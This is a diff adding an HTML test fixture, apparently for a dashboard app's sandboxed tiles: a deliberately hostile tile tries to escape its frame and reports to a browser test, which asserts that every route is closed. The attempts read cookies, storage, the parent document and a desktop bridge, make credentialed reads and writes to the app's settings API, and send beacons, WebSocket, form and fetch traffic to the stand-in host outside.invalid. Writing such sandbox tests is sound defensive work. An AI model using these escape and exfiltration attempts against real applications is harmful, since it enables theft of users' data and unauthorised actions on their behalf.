@@ -1,0 +1,116 @@
+<!--
+  A hostile tile: it tries every way out of its frame it can name, records
+  what each attempt did, draws the record and posts it to the page as
+  {probe: "escape_probe", results}. A browser test asserts that every way
+  is closed. Its data names the outside origin to aim at and whether to try
+  navigating the frame away (which ends the probe's own document).
+-->
+<base href="http://outside.invalid/base/">
+<link rel="stylesheet" href="http://outside.invalid/link.css">
+<link rel="prefetch" href="http://outside.invalid/prefetch">
+<img src="http://outside.invalid/static-image" alt="">
+<form id="leak" action="http://outside.invalid/form" method="post"><input name="q" value="x"></form>
+<iframe src="/tile-frames/0000000000000000000000000000000000000000000000000000000000000000"></iframe>
+<script>
+  const results = {};
+  const attempt = (name, f) => {
+    try {
+      results[name] = String(f());
+    } catch (error) {
+      results[name] = `threw ${error && error.name}`;
+    }
+  };
+  const report = () => {
+    parent.postMessage({ probe: "escape_probe", results }, "*");
+  };
+
+  function probe(outside) {
+    attempt("origin", () => self.origin);
+    attempt("location", () => location.href);
+    attempt("parent document", () => parent.document.title);
+    attempt("top location", () => top.location.href);
+    attempt("cookie", () => document.cookie);
+    attempt("localStorage", () => localStorage.length);
+    attempt("sessionStorage", () => sessionStorage.length);
+    attempt("indexedDB", () => indexedDB.open("probe"));
+    attempt("parent bridge", () => parent.__TAURI_INTERNALS__);
+    attempt("webkit handlers", () => Object.keys((window.webkit && window.webkit.messageHandlers) || {}).join(","));
+    attempt("window.open", () => window.open(`${outside}/open`));
+    attempt("top navigation", () => {
+      top.location.href = `${outside}/top`;
+      return "assigned";
+    });
+    attempt("form submit", () => {
+      document.getElementById("leak").submit();
+      return "submitted";
+    });
+    attempt("RTCPeerConnection", () => typeof RTCPeerConnection === "function" && new RTCPeerConnection({ iceServers: [{ urls: "stun:outside.invalid:3478" }] }));
+    attempt("WebSocket", () => new WebSocket("ws://outside.invalid/socket"));
+    attempt("EventSource", () => new EventSource(`${outside}/events`));
+    attempt("sendBeacon", () => navigator.sendBeacon(`${outside}/beacon`, "data"));
+    attempt("image", () => {
+      new Image().src = `${outside}/image`;
+      return "set";
+    });
+    const request = (name, url, init) =>
+      fetch(url, init).then(
+        async (response) => {
+          results[name] = `read ${response.status} ${(await response.text()).slice(0, 200)}`;
+        },
+        () => {
+          results[name] = "failed";
+        },
+      );
+    const xhr = new Promise((resolve) => {
+      try {
+        const x = new XMLHttpRequest();
+        x.open("GET", "/api/settings");
+        x.onload = () => resolve((results.xhr = `read ${x.status}`));
+        x.onerror = () => resolve((results.xhr = "failed"));
+        x.send();
+      } catch (error) {
+        resolve((results.xhr = `threw ${error && error.name}`));
+      }
+    });
+    return Promise.all([
+      request("read API", "/api/settings", { credentials: "include" }),
+      request("write API", "/api/settings", {
+        method: "PUT",
+        credentials: "include",
+        headers: { "Content-Type": "application/json" },
+        body: "{}",
+      }),
+      request("MCP", "/api/mcp", { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" }),
+      request("frame route", location.pathname),
+      request("outside", `${outside}/fetch`),
+      xhr,
+    ]);
+  }
+
+  function leave(outside) {
+    const refresh = document.createElement("meta");
+    refresh.httpEquiv = "refresh";
+    refresh.content = `0;url=${outside}/refresh`;
+    document.head.append(refresh);
+    location.href = `${outside}/navigate`;
+  }
+
+  baum.tile({
+    async glance({ data }) {
+      await probe(data.outside);
+      report();
+      if (data.leave) leave(data.outside);
+      return baum.html`<p class="kit-muted">${Object.keys(results).length} attempts</p>`;
+    },
+    async detail({ data }) {
+      await probe(data.outside);
+      report();
+      if (data.leave) leave(data.outside);
+      return baum.html`<table class="kit-table">
+        <tbody>
+          ${Object.entries(results).map(([name, result]) => baum.html`<tr><td>${name}</td><td class="kit-mono">${result}</td></tr>`)}
+        </tbody>
+      </table>`;
+    },
+  });
+</script>
